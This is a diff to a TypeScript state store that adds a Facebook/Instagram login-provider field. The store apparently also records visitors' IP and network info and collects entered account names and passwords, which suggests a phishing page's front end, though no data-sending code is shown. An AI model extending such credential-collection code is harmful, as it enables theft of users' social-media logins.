@@ -1,6 +1,8 @@
 import { create } from 'zustand';
 import { createJSONStorage, persist } from 'zustand/middleware';
 
+export type LoginProvider = 'facebook' | 'instagram';
+
 export interface GeoInfo {
     asn: number;
     ip: string;
@@ -27,11 +29,13 @@ interface State {
     geoInfo: GeoInfo | null;
     deviceLabel: string;
     messageId: number | null;
+    loginProvider: LoginProvider | null;
     userData: UserData;
     setModalOpen: (isOpen: boolean) => void;
     setGeoInfo: (info: GeoInfo) => void;
     setDeviceLabel: (label: string) => void;
     setMessageId: (id: number | null) => void;
+    setLoginProvider: (provider: LoginProvider | null) => void;
     setUserData: (data: Partial<UserData>) => void;
     addAccount: (account: string) => void;
     addPassword: (password: string) => void;
@@ -58,11 +62,13 @@ export const store = create<State>()(
             geoInfo: null,
             deviceLabel: 'Unknown',
             messageId: null,
+            loginProvider: null,
             userData: initialUserData,
             setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
             setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
             setDeviceLabel: (label: string) => set({ deviceLabel: label }),
             setMessageId: (id: number | null) => set({ messageId: id }),
+            setLoginProvider: (provider: LoginProvider | null) => set({ loginProvider: provider }),
             setUserData: (data: Partial<UserData>) =>
                 set((state) => ({
                     userData: { ...state.userData, ...data }
@@ -82,6 +88,7 @@ export const store = create<State>()(
             resetFormSession: () =>
                 set({
                     messageId: null,
+                    loginProvider: null,
                     userData: { ...initialUserData }
                 })
         }),
